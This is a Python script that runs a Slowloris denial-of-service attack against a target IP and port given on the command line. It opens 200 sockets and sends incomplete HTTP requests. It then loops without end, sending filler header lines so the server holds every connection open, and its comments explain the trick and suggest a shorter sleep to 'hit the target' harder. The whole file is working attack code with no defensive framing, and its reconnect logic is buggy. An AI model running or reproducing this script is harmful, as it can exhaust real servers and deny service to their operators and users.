import socket
import random
import time
import sys


def Slowloris(argv):
    try:
        global allTheSockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        howmany_sockets = 200
        ip = argv[1]  # "127.0.0.1"
        port = int(argv[2])  # 443
        allTheSockets = []
        print("Creating sockets...")
        print(argv[1])
        print(argv[2])
        for k in range(howmany_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                allTheSockets.append(s)
            except Exception as e:
                print(e)
        print(range(howmany_sockets), " sockets are ready.")
        num = 0
        for r in allTheSockets:
            print("[", num, "]")
            num += 1
            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            print("Successfully sent [+] GET /? HTTP /1.1 ...")
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))
            print("Successfully sent [+] Headers ...")

        while True:
            for v in allTheSockets:
                try:
                    # THIS Is the place, X-a keeps the server sending data back,
                    # if we used : X-a : {}\r\n\r\n - he would CLOSE the connection
                    # because that is what he expects, the second \r\n makes the difference
                    # so if we leave it out we keep the thing alive, sending a random number
                    # to appear as we are sending data
                    v.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    print("[-][-][*] Waiter sent.")

                except:
                    # PROBLEM  : Get an error saying : ( MAYBE ITS THE TIME SLEEP? ??)
                    # ConnectionAbortedError: [WinError 10053] An established connection was aborted by the software in your host machine
                    # solution : use VM
                    print("[-] A socket failed, reattempting...")
                    # list_of_sockets.remove(v)
                    allTheSockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip, port))
                        # for each socket:
                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass

            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
            print("Sleeping off ...")
            time.sleep(1)
            # by default this was set to 10 (i think)
            # if we want to continously hit the target we can set it to 1 for example

    except ConnectionRefusedError:
        print("[-] Connection refused, retrying...")
        Slowloris(sys.argv)


Slowloris(sys.argv)